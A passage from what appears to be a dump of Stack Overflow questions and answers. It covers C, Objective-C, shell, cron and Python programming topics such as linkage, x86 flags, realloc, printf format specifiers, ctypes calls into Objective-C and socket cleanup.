<p>Then, <code>func()</code> can only be called by other functions defined in the same file (technically, the same <em>translation unit</em>: other functions whose definitions are included by a <code>#include</code> directive can still access it).  <code>func</code> is said to have <em>internal linkage</em>.  All other functions (that is, without the <code>static</code> keyword) are said to have <em>external</em> linkage.</p>

<p>Beyond that, no, there is no way to make functions inaccessible.  You can use macros to change the name of the function, but other code can always still access it with the appropriate name.</p>
"
"<p>From what I've read, seems like there are 9 different flags. Is it possible to read/change them directly? I know I can know for example if the zero flag is set after doing a cmp/jmp instruction, but I'm asking if it's possible to do something like</p>

<pre><code>mov eax, flags
</code></pre>

<p>or something.</p>

<p>Also, for writting, is it possible to set them by hand?</p>

<p>Thanks</p>
","9530","","<p>Some flags can be set or cleared directly with specific instructions:</p>

<ul>
<li><a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/CLC.htm"">CLC</a>, <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/STC.htm"">STC</a>, and <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/CMC.htm"">CMC</a>: clear, set, and complement the carry flag</li>
<li><a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/CLI.htm"">CLI</a> and <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/STI.htm"">STI</a>: clear and set the interrupt flag (which should be done atomically)</li>
<li><a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/CLD.htm"">CLD</a> and <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/STD.htm"">STD</a>: clear and set the direction flag</li>
</ul>

<p>For reading and writing the sign, zero, auxiliary carry, parity, and carry flags, you can use <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/LAHF.htm"">LAHF</a> to load the lower 8 bits (those 5 flags plus 3 indeterminate bits) into the AH register, and you can use <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/SAHF.htm"">SAHF</a> to store those values from AH back into the flags register.</p>

<p>You can also use the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/PUSHF.htm"">PUSHF</a> instruction to push the flags onto the stack, read and modify them on the stack, and then use the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/POPF.htm"">POPF</a> instruction to store them back into the flags register.</p>

<p>Note that you cannot set the VM and RF flags with POPF -- they retain their previous values.  Similarly, you can only change the I/O privilege level when executing at privilege level 0, and the interrupt flag can only be changed when executing at a privilege level at least as privileged as the I/O privilege level.</p>
"
"<p>I am reading a very large file using a NSInputStream and sending them to a device in packets.  If the receiver does not get a packet, I can send back to the sender with a packet number, representing the starting location in bytes of the packet missing.</p>

<p>I know an NSInputStream cannot rewind and grab the packet, but is there another way to grab the requested byte range without loading the entire large file into memory?</p>

<p>If there was a [NSData dataWithContentsOfFileAtPath:inRange] method, it would be perfect.</p>
","9530","","<p>I don't think there's a standard function that does that, but you could write one yourself, using a category and the C stdio API:</p>

<pre><code>@interface NSData(DataWithContentsOfFileAtOffsetWithSize)
+ (NSData *) dataWithContentsOfFile:(NSString *)path atOffset:(off_t)offset withSize:(size_t)bytes;
@end

@implementation NSData(DataWithContentsOfFileAtOffsetWithSize)

+ (NSData *) dataWithContentsOfFile:(NSString *)path atOffset:(off_t)offset withSize:(size_t)bytes
{
  FILE *file = fopen([path UTF8String], ""rb"");
  if(file == NULL)
        return nil;

  void *data = malloc(bytes);  // check for NULL!
  fseeko(file, offset, SEEK_SET);
  fread(data, 1, bytes, file);  // check return value, in case read was short!
  fclose(file);

  // NSData takes ownership and will call free(data) when it's released
  return [NSData dataWithBytesNoCopy:data length:bytes];
}

@end
</code></pre>

<p>Then you can this:</p>

<pre><code>// Read 100 bytes of data beginning at offset 500 from ""somefile""
NSData *data = [NSData dataWithContentsOfFile:@""somefile"" atOffset:500 withSize:100];
</code></pre>
"
"<p>What is the difference between using an environment variable, like PATH, as $PATH or ${PATH}?</p>
","9530","","<p>There's no difference in most cases.  The only times it matters is if you want to include trailing text after the expansion.  For example, suppose your <code>PATH</code> contained the string <code>FOO</code> (not actually a valid path, but this is for an example), and you wanted to form the string <code>FOOBAR</code>.  If you did</p>

<pre><code>$PATHBAR
</code></pre>

<p>You would get the expansion of the variable named <code>PATHBAR</code>, which is probably not what you wanted.  If you did</p>

<pre><code>$PATH BAR
</code></pre>

<p>You would get a space between <code>FOO</code> and <code>BAR</code>, also not what you wanted.  The solution is to use braces:</p>

<pre><code>${PATH}BAR
</code></pre>

<p>This gives you <code>FOOBAR</code>.</p>
"
"<p>I noticed that AccExplorer (accessibility explorer) shows when controls are visible or invisible. How does it determine this? The api for MSAA does not have a IsVisible function. Any ideas?</p>

<p>Edit: IsWindowVisible does not actually tell you if it has been drawn or not. Even if something is 100% obscuring the window, IsWindowVisible can still return TRUE.</p>
","9530","","<p>You can test if a window (including controls) is visible with the standard <a href=""http://msdn.microsoft.com/en-us/library/ms633530%28VS.85%29.aspx"" rel=""nofollow""><code>IsWindowVisible()</code></a> function.</p>
"
"<p>Say i have a file, t.txt, that contains the following two lines:</p>

<p>one</p>

<p>two</p>

<p>Now, I would like to write a program which will #include that file somehow and print its contents, nothing more. That is, i want the contents of that file to appear in my code as a static text, at compile time.</p>

<p>Any ideas?</p>

<p><hr /></p>

<p>The reason im asking is this:</p>

<p>I would like to create a quine by including my own file (with ifndefs to prevent recursive inclusion after the first two): <a href=""http://en.wikipedia.org/wiki/Quine%5F%28computing%29"" rel=""nofollow"">http://en.wikipedia.org/wiki/Quine_(computing)</a> . So I'd still love to get an answer.</p>
","9530","","<p>As far as I'm aware, the shortest possible quine in C is this:</p>

<pre><code>main(){char*a=""main(){char*a=%c%s%c;printf(a,34,a,34);}"";printf(a,34,a,34);}
</code></pre>

<p>Note that this is not valid C++, since it uses an implicit definition of <code>printf()</code>.  To make it valid C++, you need to do this:</p>

<pre><code>#include &lt;stdio.h&gt;
main(){char*a=""#include &lt;stdio.h&gt;%cmain(){char*a=%c%s%c;printf(a,10,34,a,34);}"";printf(a,10,34,a,34);}
</code></pre>

<p>No tricky include tricks -- just carefully constructing a string and printing it out twice, and using ASCII codes (10 and 34 instead of <code>'\n'</code> and <code>'""'</code>) to avoid annoyingness with having to escape stuff.</p>
"
"<p>Please answer with the shortest possible source code for a program that converts an arbitrary plaintext to its corresponding ciphertext, following the sample input and output I have given below.  Bonus points* for the least CPU time or the least amount of memory used.</p>

<h2>Example 1:</h2>

<p><strong>Plaintext:</strong> The quick brown fox jumps over the lazy dog.  Supercalifragilisticexpialidocious!</p>

<p><strong>Ciphertext:</strong> eTh kiquc nobrw xfo smjup rvoe eth yalz .odg  !uioiapeislgriarpSueclfaiitcxildcos</p>

<h2>Example 2:</h2>

<p><strong>Plaintext:</strong> 123 1234 12345 123456 1234567 12345678 123456789</p>

<p><strong>Ciphertext:</strong> 312 4213 53124 642135 7531246 86421357 975312468</p>

<h2>Rules:</h2>

<ol>
<li>Punctuation is defined to be included with the word it is closest to.</li>
<li>The center of a word is defined to be ceiling((strlen(word)+1)/2).</li>
<li>Whitespace is ignored (or collapsed).</li>
<li>Odd words move to the right first.  Even words move to the left first.</li>
</ol>

<p>You can think of it as reading every other character backwards (starting from the end of the word), followed by the remaining characters forwards.  Corporation => XoXpXrXtXoX => niaorCoprto.</p>

<p>Thank you to those who pointed out the inconsistency in my description.  This has lead many of you down the wrong path, which I apologize for. Rule #4 should clear things up.</p>

<p>*Bonus points will only be awarded if Jeff Atwood decides to do so.  Since I haven't checked with him, the chances are slim.  Sorry.</p>
","9530","","<h1>C, 140 characters</h1>

<p>Nicely formatted:</p>

<pre><code>main(c, v)
  char **v;
{
  for( ; *++v; )
  {
    char *e = *v + strlen(*v), *x;
    for(x = e-1; x &gt;= *v; x -= 2)
      putchar(*x);
    for(x = *v + (x &lt; *v-1); x &lt; e; x += 2)
      putchar(*x);
    putchar(' ');
  }
}
</code></pre>

<p>Compressed:</p>

<pre><code>main(c,v)char**v;{for(;*++v;){char*e=*v+strlen(*v),*x;for(x=e-1;x&gt;=*v;x-=2)putchar(*x);for(x=*v+(x&lt;*v-1);x&lt;e;x+=2)putchar(*x);putchar(32);}}
</code></pre>
"
"<pre><code>ls &gt; ls.out
</code></pre>

<p>this will include ls.out in the list too. 
My understanding is:  > (shell output redirection operator is creating a file first (to take the STDOUT) if it is not already existing and then ls command is coming to play and it is including the just created ls.out file in the output. 
Is this correct? If not, can you please elaborate the workings of that command.</p>

<p>Similarly</p>

<pre><code>wc temp &gt; temp
</code></pre>

<p>Will print 0 0 0 temp inside the just created temp file.</p>

<p>This behavior of shell is interesting. I wonder, how it is actually working.  BTW, both are exercises in The Unix Programming Environment Book. As I mentioned the answer above, I want some expert to correct my understanding. </p>
","9530","","<p>When redirecting standard output with <code>&gt;</code>, the shell will create the file (as an empty file) if it doesn't already exist.  Further, that file is opened before the shell forks and execs the command being executed.  When you do <code>wc temp &gt; temp</code>, the shell opens the file for writing and then forks and execs <code>wc</code>, passing on its open file handles in the process.</p>
"
"<p>I'm working on a program that renders iterated fractal systems. I wanted to add the functionality where someone could define their own iteration process, and compile that code so that it would run efficiently.</p>

<p>I currently don't know how to do this and would like tips on what to read to learn how to do this.</p>

<p>The main program is written in C++ and I'm familiar with C++. In fact given most of the scenarios I know how to convert it to assembly code that would accomplish the goal, but I don't know how to take the extra step to convert it to machine code. If possible I'd like to dynamically compile the code like how I believe many game system emulators work.</p>

<p>If it is unclear what I'm asking, tell me so I can clarify. </p>

<p>Thanks!</p>
","9530","","<p><a href=""http://llvm.org/"" rel=""nofollow"">LLVM</a> should be able to do what you want to do.  It allows you to form a description of the program you'd like to compile in an object-oriented manner, and then it can compile that program description into native machine code at runtime.</p>
"
"<p>I have something like this</p>

<pre><code>char *current_day, *current_time;
system(""date +%F);
system(""date +%T);
</code></pre>

<p>It prints the current day and time in the stdout, but I want to get this output or assign them in current_day and current_time variables, so that I can do some processing with those values later on.</p>

<pre><code>current_day ==&gt; current day
current_time ==&gt; current time
</code></pre>

<p>Only solution that I can think of now is direct the output to some file, and then read the file and then assign the values of date and time to current_day and current_time. But I think this is not  so good way. Is there any other short and elegant way ?</p>

<p>Hope the problem is clear !!</p>

<p>Thanks.</p>
","9530","","<p>Use <a href=""http://en.cppreference.com/w/c/chrono/time""><code>time()</code></a> and <a href=""http://en.cppreference.com/w/c/chrono/localtime""><code>localtime()</code></a> to get the time:</p>

<pre><code>time_t t = time(NULL);
struct tm tm = *localtime(&amp;t);

printf(""now: %d-%d-%d %d:%d:%d\n"", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
</code></pre>
"
"<p><br />
I want to change this code into assembly code, working on mac, how to do this?</p>

<pre><code>while (a --)
{
    *pDest ++ += *pSrc ++;
}
</code></pre>
","9530","","<blockquote>
  <p>It's intel mac, and on iPhone. I am working on a program that uses this code in a thread, and the thread is always doing such stuff, sometimes it's stuck, so I am wondering whether it's because the calculation is too heavy for iPhone.</p>
</blockquote>

<p>No, your problem has nothing to do with this code.  Let the compiler do its job and optimize this.  Your problem is elsewhere.  It sounds like you have a race condition or deadlock between threads somehow.  I can't psychically debug your problem without more information, but I can say for sure you're barking up the wrong tree.</p>
"
"<p>How does relloc behaves when it has to resize the allocated memory to a bigger size and it   has to be done in a separate memory area as the requested amount of memory can be resized   inplace. Does the original memory is deallocated automatically by relloc (I would think so  ) or it has to be done by the programmer (not likely) ?  </p>
","9530","","<p>Yes, <code>realloc</code> automatically handles freeing the original memory.  If the memory block can be resized in place, then <code>realloc</code> will do so.  If not, it will allocate a new memory block that is large enough, copy the data from the old block to the new, and free the old block.  You don't have to worry about freeing it yourself.</p>

<p>If <code>realloc</code> fails (e.g. you asked for way too much memory, and it couldn't allocate that much), then the original memory is <em>NOT</em> freed.  If you're not careful, you can leak memory -- if <code>realloc</code> returns NULL due to a failure and you don't keep a pointer to the original memory block, that memory will remain allocated and leak.</p>
"
"<p>In C programming how do you get the current user and the current working directory.
I'm trying to print something like this:</p>

<pre><code>  asmith@mycomputer:~/Desktop/testProgram:$
  (user) (computerName) (current directory)
</code></pre>

<p>I have the following code, but the username is showing as NULL. Any ideas what I'm doing wrong?</p>

<pre><code>void prompt()
{
        printf(""%s@shell:~%s$"", getenv(""LOGNAME""), getcwd(currentDirectory, 1024));                 
}
</code></pre>
","9530","","<p>Aside from the fact that you should be using the environment variable <code>USER</code> instead of <code>LOGNAME</code>, you shouldn't be using environment variables for this in the first place.  You can get the current user ID with <a href=""http://linux.die.net/man/2/getuid""><code>getuid(2)</code></a> and the current effective user ID with <a href=""http://linux.die.net/man/2/geteuid""><code>geteuid(2)</code></a>, and then use <a href=""http://linux.die.net/man/3/getpwuid""><code>getpwuid(3)</code></a> to get the user name from the user ID from the passwd file:</p>

<pre><code>struct passwd *p = getpwuid(getuid());  // Check for NULL!
printf(""User name: %s\n"", p-&gt;pw_name);
</code></pre>

<p>To get the current computer name, use <a href=""http://linux.die.net/man/2/gethostname""><code>gethostname(2)</code></a>:</p>

<pre><code>char hostname[HOST_NAME_MAX+1];
gethostname(hostname, sizeof(hostname));  // Check the return value!
printf(""Host name: %s\n"", hostname);
</code></pre>
"
"<p>Having learned Java and C++, I've learned the OO-way. I want to embark on a fairly ambitious project but I want to do it in C. I know how to break problems down into classes and how to turn them into class hierarchies. I know how to abstract functionality into abstract classes and interfaces. I'm even somewhat proficient at using polymorphism in an effective way.</p>

<p>The problem is that when I'm presented with a problem, I only way I know how to do it is in an Object-Oriented way. I've become too dependent on Object-Oriented design philosophies and methodologies.</p>

<p>I want to learn how to think in a strictly procedural way. How do I do things in a world that lacks classes, interfaces, polymorphism, function overloading, constructors, etc.</p>

<p>How do you represent complex concepts using only non-object-oriented <code>struct</code>s? How do you get around a lack of function overloading? What are some tip and tricks for thinking in a procedural way?</p>
","9530","","<p>The standard way to do polymorphic behavior in C is to use function pointers.  You'll find a lot of C APIs (such as the standard <a href=""http://linux.die.net/man/3/qsort"" rel=""nofollow""><code>qsort(3)</code></a> and <a href=""http://linux.die.net/man/3/bsearch"" rel=""nofollow""><code>bsearch(3)</code></a>) take function pointers as parameters; some non-standard ones such as <a href=""http://www.ipnom.com/FreeBSD-Man-Pages/qsort%5Fr.3.html"" rel=""nofollow""><code>qsort_r</code></a> take a function pointer and a <em>context</em> pointer (<code>thunk</code> in this case) which serves no purpose other than to be passed back to the callback function.  The context pointer functions exactly like the <code>this</code> pointer in object-oriented languages, when dealing with function objects (e.g. functors).</p>

<p>See also:</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/351733/can-you-write-object-oriented-code-in-c"">Can you write object-oriented code in C?</a></li>
<li><a href=""http://stackoverflow.com/questions/415452/object-orientation-in-c"">Object-Orientation in C</a></li>
</ul>
"
"<p>Edited: Look at comments below. Short version: Screen simply flashes when I try to run program.</p>

<pre><code>int main(int argc, char** args)
{

    bool quit = false;

    std::ofstream out(""error.txt"");

    if(init() == false)
    {
        return 1;
    }

    if (load_files() == false)
    {
        return 1;
    }

    // Render the text
    message = TTF_RenderText_Solid(font, ""The quick brown fox jumps over the lazy dog"", textColor);

    // If there was an error in rendering the text
    if (message == NULL)
    {
        return 1;
    }

    // Apply the images to the screen
    apply_surface(0,0, background, screen);
    apply_surface(0,150, message, screen);

    // Update the screen
    if (SDL_Flip(screen) == -1)
    {
        std::cout &lt;&lt; SDL_GetError() &lt;&lt; '\n';
        return 1;
    }

    while (quit == false)
    {
        while (SDL_PollEvent(&amp;event))
        {
            if (event.type == SDL_QUIT)
            {
                quit = true;
            }
        }
    }

    clean_up();

    return 0;
}
</code></pre>
","9530","","<p>What's the problem you're having?  Is it failing to compile?  Failing to link?  Failing at program load time due to missing DLLs/shared libraries?  Or failing at runtime?</p>

<p>Is <code>screen</code> NULL after the call to <code>SDL_SetVideoMode()</code>?  If so, you should print out <code>SDL_GetError()</code>.  If it is in fact <code>TTF_Init()</code> that is failing, then what is the error message that is printed?</p>
"
"<p>Again, porting 32-bit app to 64-bit. I get the negative subscript error on the C_ASSERT statement mentioned below..</p>

<pre><code>
C_ASSERT (sizeof(somestruct) == some#define);
</code></pre>

<p>I also read the <a href=""http://support.microsoft.com/kb/68475"" rel=""nofollow"">http://support.microsoft.com/kb/68475</a> article but not sure if I know how to fix it in this case.</p>

<p>Help is appreciated.</p>

<p>Thanks in advance.</p>
","9530","","<p>I'm guessing the <code>C_ASSERT</code> macro is defined something like this:</p>

<pre><code>#define C_ASSERT(x) typedef char C_ASSERT_ ## __COUNTER__ [(x) ? 1 : -1];
</code></pre>

<p>This is a compile-time assertion: if the compile-time expression <code>x</code> is true, then this expands to something like</p>

<pre><code>typedef char C_ASSERT_1[1];
</code></pre>

<p>which declares the typename <code>C_ASSERT_1</code> to be an alias for the type <code>char[1]</code> (array of 1 <code>char</code>).  Converely, if the expression <code>x</code> is false, it expands to</p>

<pre><code>typedef char C_ASSERT_1[-1];
</code></pre>

<p>which is a compiler error, since you can't have an array type of negative size.</p>

<p>Hence, your problem is that the expression <code>sizeof(somestruct) == some#define</code> is false, i.e. the size of <code>somestruct</code> is NOT what your code is expecting.  You need to fix this -- either change the size of <code>somestruct</code>, or change the value of <code>some#define</code>, making sure that this won't break anything.</p>
"
"<p>In Objective C, is there a way to determine at runtime, if an object is retained, which other object might be retaining that object?</p>

<p>Or to phrase it a little differently:</p>

<p>If there are leashes on the dog is it possible to know who is holding the leash?</p>

<p>Assume you have this hypothetical scenario:</p>

<p>MyObjectOne</p>

<p>and </p>

<p>MyObjectTwo</p>

<p>inside the implementation of MyObjectTwo is something like</p>

<pre><code>- (void)setFirstObject:(MyObjectOne *)firstObj {
 [firstObj retain];
    // do stuff with object and under certain conditions don't release it    
}
</code></pre>

<p>Now elsewhere in the code there might be other places which create and retain the objects</p>

<pre><code>// Create the two objects
myFirstObject = [[MyObjectOne alloc] init];   
mySecondObject = [[MyObjectTwo alloc] init];

// ...
// Some process requires retaining the first object 
[myFirstObject retain]

// ...
// some other place requires passing the first object to the second object
// at which point the first object is retained by the second object 
[mySecondObject setFirstObject:myFirstObject];

// ...
// further on the first object is released
[myFirstObject release]
</code></pre>

<p>At this point theoretically myFirstObject should have a retain count of 1 because it was retained inside MyObjectTwo. Is it also, possible to know WHAT is retaining the object? In other words it is possible to know that myFirstObject has a retain count of 1 AND it is currently retained by mySecondObject. Is there a convenience method for finding this information out? Is it possible to have conditional code that works like this psuedo code:</p>

<pre><code>if (MyObjectTwo is retaining MyObjectOne)
{
 // do something in particular
}
</code></pre>

<p>Take this a few steps further and say myFirstObject has a retain count higher than 1 and that there are other objects MyObjectThree and MyObjectFour which behave similar to MyObjectTwo in that they have methods that can retain MyObjectOne. And now assume that there are multiple instances of MyObjectTwo, MyObjectThree and MyObjectFour some which are retaining the first object and some which are not. Is there a way to know who and what is doing the retaining?</p>

<p>Still learning, so my syntax might not be 100% correct but hopefully the question is clear.</p>
","9530","","<p>No, you can't do that.  Objects do not keep track of who has retained them, and there isn't always such an object, since you can call <code>retain</code> from inside a plain vanilla C function, which has no associated object.</p>

<p>If you want to keep track of who is retaining an object, you need to do this yourself.  Every time you retain, you add yourself to a list of retainers, e.g. an <code>NSArray</code> inside the object being retained.</p>

<p>I don't know exactly what you're trying to do, but you're almost certainly going about it the wrong way.  Figuring out who is retaining what is not really a useful thing to know most of the time, and there's probably a much better way of doing what yo uwant.</p>
"
"<p>If my application crashes at a customer site I'd like them to be able to send me a crash log with the minimal amount of hassle on their part.  On OS X it's very easy: I can tell them where to find the crash log and send it.</p>

<p>What is the best way to do this on Windows?  Is Dr. Watson as good as it gets?  Can I count on that being set up by default?</p>

<p>The ideal solution would be part of the standard release of the software (i.e., not a special build) and would work for XP, Vista, Windows 7 and for 32-bit and 64-bit applications.</p>

<p>Thanks for any ideas!</p>
","9530","","<p>I've been pretty happy with <a href=""http://www.codeproject.com/KB/debug/XCrashReportPt1.aspx"" rel=""nofollow"">XCrashReport</a>.  It automatically emails out a crash report with tons of useful information, including a full stack trace with symbols, register dump, etc.</p>
"
"<p>I've been reading up on garbage collection looking for features to include in my programming language and I came across ""weak pointers"".  From <a href=""http://www.iecc.com/gclist/GC-lang.html#Weak%20pointers"">here</a>:</p>

<blockquote>
  <p>Weak pointers are like pointers,
  except that references from weak
  pointers do not prevent garbage
  collection, and weak pointers must
  have their validity checked before
  they are used.</p>
  
  <p>Weak pointers interact with the
  garbage collector because the memory
  to which they refer may in fact still
  be valid, but containing a different
  object than it did when the weak
  pointer was created. Thus, whenever a
  garbage collector recycles memory, it
  must check to see if there are any
  weak pointers referring to it, and
  mark them as invalid (this need not be
  implemented in such a naive way).</p>
</blockquote>

<p>I've never heard of weak pointers before.  I would like to support many features in my language, but in this case I cannot for the life of me think of a case where this would be useful.  For what would one use weak pointer?</p>
","9530","","<p>If your language's garbage collector is incapable of collecting circular data structures, then you can use weak references to enable it to do so.  Normally, if you have two objects which have references to each other, but no other outside object has a reference to those two, they would be candidates for garbage collection.  But, a naïve garbage collector wouldn't collect them, since they contain references to each other.</p>

<p>To fix this, you make it so one object has a strong reference to the second, but the second has a weak reference to the first.  Then, when the last outside reference to the first object goes away, the first object becomes a candidate for garbage collection, followed shortly thereafter by the second, since now its only reference is weak.</p>
"
"<p>I want my XCode Objective-C project to be able to detect which configuration it is being built with. How can I achieve this?</p>

<p>Thanks in advance.</p>
","9530","","<p>You can have per-configuration macro definitions.  Open up your project settings, select your configuration from the <strong>Configuration</strong> drop-down menu, and go to <strong>Preprocessor Macros</strong>.  For Debug, I recommend defining the macro <code>_DEBUG</code>, and for release I recommend defining <code>_RELEASE</code>, as these are the typical ones which are used.  These are passed on to the compiler as <code>-D</code> options, e.g. <code>-D_DEBUG</code>.</p>

<p>You can also put <code>-D</code> options directly into the <strong>Other C Flags</strong> setting.</p>
"
"<p>The following does work as expected:</p>

<pre>date +'%d-%b-%Y-%H-%M'

28-Sep-2009-14-28</pre>

But none of the following 4 entries from crontab are working.

<pre>
* * * * * date +\'%d-%b-%Y-%H-%M\' >> /backup/shantanu/testing.txt
* * * * * date +'%d-%b-%Y-%H-%M' >> /backup/shantanu/testing1.txt
* * * * * date +""%d-%b-%Y-%H-%M"" >> /backup/shantanu/testing2.txt
* * * * * date +\""%d-%b-%Y-%H-%M\"" >> /backup/shantanu/testing3.txt
</pre>

<pre>
Error:
/bin/sh: -c: line 0: unexpected EOF while looking for matching `""'
/bin/sh: -c: line 1: syntax error: unexpected end of file
</pre>

<p>I can save the same code in a shell script and set the cron, but I will like to know if it is possible to directly set a cron for the task.</p>

<p>The actual cron entry that I am trying to set looks something like this...</p>

<pre>16 * * * * mysqldump myDB myTB > /backup/ABCbc$(date +'%d-%b-%Y-%H-%M').sql 2> /backup/ABCbc_errORS$(date +'%d-%b-%Y-%H-%M').txt</pre>
","9530","","<p>Cron is trying to execute your scripts using <code>/bin/sh</code>, which probably doesn't support as many features as the shell you normally use, and it's getting confused on the syntax.  Assuming you're using bash, try putting this in your crontab:</p>

<pre><code>SHELL=/usr/bin/bash
* * * * * date +'%d-%b-%Y-%H-%M' &gt;&gt; /backup/shantanu/testing1.txt
</code></pre>
"
"<p>Is there a way to dynamically call an Objective C function from Python?</p>

<p>For example, On the mac I would like to call this Objective C function</p>

<pre><code>[NSSpeechSynthesizer availableVoices]
</code></pre>

<p>without having to precompile any special Python wrapper module.</p>
","9530","","<p>As others have mentioned, PyObjC is the way to go.  But, for completeness' sake, here's how you can do it with <a href=""http://docs.python.org/library/ctypes.html"">ctypes</a>, in case you need it to work on versions of OS X prior to 10.5 that do not have PyObjC installed:</p>

<pre><code>import ctypes
import ctypes.util

# Need to do this to load the NSSpeechSynthesizer class, which is in AppKit.framework
appkit = ctypes.cdll.LoadLibrary(ctypes.util.find_library('AppKit'))
objc = ctypes.cdll.LoadLibrary(ctypes.util.find_library('objc'))

objc.objc_getClass.restype = ctypes.c_void_p
objc.sel_registerName.restype = ctypes.c_void_p
objc.objc_msgSend.restype = ctypes.c_void_p
objc.objc_msgSend.argtypes = [ctypes.c_void_p, ctypes.c_void_p]

# Without this, it will still work, but it'll leak memory
NSAutoreleasePool = objc.objc_getClass('NSAutoreleasePool')
pool = objc.objc_msgSend(NSAutoreleasePool, objc.sel_registerName('alloc'))
pool = objc.objc_msgSend(pool, objc.sel_registerName('init'))

NSSpeechSynthesizer = objc.objc_getClass('NSSpeechSynthesizer')
availableVoices = objc.objc_msgSend(NSSpeechSynthesizer, objc.sel_registerName('availableVoices'))

count = objc.objc_msgSend(availableVoices, objc.sel_registerName('count'))
voiceNames = [
  ctypes.string_at(
    objc.objc_msgSend(
      objc.objc_msgSend(availableVoices, objc.sel_registerName('objectAtIndex:'), i),
      objc.sel_registerName('UTF8String')))
  for i in range(count)]
print voiceNames

objc.objc_msgSend(pool, objc.sel_registerName('release'))
</code></pre>

<p>It ain't pretty, but it gets the job done.  The final list of available names is stored in the <code>voiceNames</code> variable above.</p>

<p><strong>2012-4-28 Update</strong>: Fixed to work in 64-bit Python builds by making sure all parameters and return types are passed as pointers instead of 32-bit integers.</p>
"
"<p>I would like to use unmanaged C++.</p>

<p>The following code:</p>

<pre><code>#include""string.h""
std::string nodename[100]; 
</code></pre>

<p>Gives me the following compilation error:</p>

<blockquote>
  <p>'std' : is not a class or namespace
  name</p>
</blockquote>
","9530","","<p>You're using the wrong header file.  You should be <code>#include</code>ing <code>&lt;string&gt;</code>, not <code>""string.h""</code>:</p>

<ul>
<li><code>&lt;string&gt;</code> is the header file that defines the C++ STL class <code>std::string</code></li>
<li><code>&lt;string.h&gt;</code> is the header file for the C standard library of string functions, which operate on C strings (<code>char *</code>)</li>
<li><code>&lt;cstring&gt;</code> is the header file like <code>&lt;string.h&gt;</code>, but it declares all of the C string functions inside of the <code>std</code> namespace</li>
</ul>

<p>For system header files like these, you should always <code>#include</code> them with angle brackets, not with double quotes.</p>
"
"<pre><code>int main(void){
    float x =1;
    float y =2;
    while (x&lt;y){
    	x = x +1 ;
    	y = y +1;
}
    printf(""x is %d\n"", x);
    printf(""y is %d\n"", y);
}
</code></pre>

<p>I would expect x and y to increase to the point we run out of bits, but it seems like x and y is alway 0 in this case...</p>
","9530","","<p>As others have stated, you should be using the <code>%f</code> format to print floats, not <code>%d</code>, which is for integers.  There is also <code>%e</code>, which prints the float in scientific notation instead of fixed notation, and there's also <code>%g</code>, which prints it in either scientific or fixed, whichever is shorter.</p>

<p>The reason why it prints as 0 is because float arguments automatically get converted to doubles when passed as arguments to variadic functions (that is, functions which take an unspecified number of arguments) such as <code>printf()</code>.  The representations of the numbers 2 and 3 (the values of <code>x</code> and <code>y</code>) as doubles are 0x4000000000000000 and 0x4008000000000000 respectively, as calculated by the <a href=""http://babbage.cs.qc.edu/IEEE-754/Decimal.html"">IEEE-754 Floating-Point Conversion calculator</a>.</p>

<p>On little-endian machines (e.g. anything x86-based), the <code>%d</code> modifier grabs the next 4 bytes off the stack and interprets them as an integer.  So, when you pass the float 2, it gets converted to a double as 0x4000000000000000, which in little-endian is 00 00 00 00 00 00 00 40.  The first four bytes make the integer 0, so that's what is printed out.</p>

<p>Note that if you printed both numbers in one statement instead of two, you would get a more surprising result:</p>

<pre><code>printf(""x=%d y=%d\n"", x, y);
// Output: x=0 y=1073741824
</code></pre>

<p>Most compilers can warn you about these types of errors if you set the warning level high enough.  With GCC, you should compile with the <code>-Wformat</code> option (or <code>-Wall</code>, which includes <code>-Wformat</code>), and it will warn you when you try to print a float with <code>%d</code> by accident.</p>
"
"<p>We have a method in the iPhone SDK that is a delegate method. Problem is, the OS calls this method twice at the exact same time. This method does some heavy lifting so I don't want to execute the logic twice. What is a good way to detect this and prevent one of the two from running?</p>

<p><hr /></p>

<p>Forgot to mention that, it is called from different threads.</p>
","9530","","<p>Use <a href=""http://opengroup.org/onlinepubs/007908799/xsh/pthread%5Fonce.html"" rel=""nofollow""><code>pthread_once()</code></a> -- it was explicitly designed to do exactly this.  The only problem is that the function you pass it can't take any arguments, so you have to use global variables to pass information to it.</p>
"
"<p>I'm getting this string as an input ""<code>&lt;operator value=1/&gt;</code>"".
How in C can I parse out this string to get the ""1"" back?</p>
","9530","","<p>If you know that that's exactly the type of string you'll always get, you can just use <code>sscanf()</code>:</p>

<pre><code>int value;
if(sscanf(theString, ""&lt;operator value=%d/&gt;"", &amp;value) == 1)
    ;  // parsing succeeded, use value
else
    ;  // parsing failed
</code></pre>

<p>If you're going to be receiving more complex input, I recommend using an XML parsing library such as <a href=""http://expat.sourceforge.net/"" rel=""nofollow"">expat</a> or <a href=""http://www.grinninglizard.com/tinyxml/"" rel=""nofollow"">TinyXML</a> (requires C++).</p>
"
"<p>I'm modifying Python code that have this form:</p>

<pre><code>def foo(self):
    try:
        connect socket
    except Exception, e:
        some error reporting stuff
        return an error

    use the socket
    do some other stuff

    if some condition:
        return

    do some more stuff
    socket.close()
    return normally
</code></pre>

<p>Coming from Java I would like to have a try - finally around the whole thing to make sure that the socket is closed. Should this code also have that or is it some kind of Pythonic magic happening in the background that makes it so that you don't have to?</p>

<p>I read in the python docs that sockets are closed when they are garbage collected. But relying on the garbage collector to close your sockets doesn't feel so good.</p>
","9530","","<p>You can use a <code>try-finally</code> block, which was added in Python 2.5:</p>

<pre><code>try:
    open socket
    do stuff with socket
finally:
    close socket
</code></pre>

<p>Or you can use the <code>with</code> statement, which was added in Python 2.6 (and can be used in 2.5 with a <code>from __future__ import with_statement</code> declaration):</p>

<pre><code>with open_the_socket() as s:
    use s
</code></pre>

<p>This will automatically close the socket when the inner block is exited, whether it's exited normally or via an exception, provided that the socket class closes in its <code>__exit__()</code> method.</p>

<p>As of Python 2.7.2 the <code>__exit__()</code> method is not implemented on the socket class.</p>
"
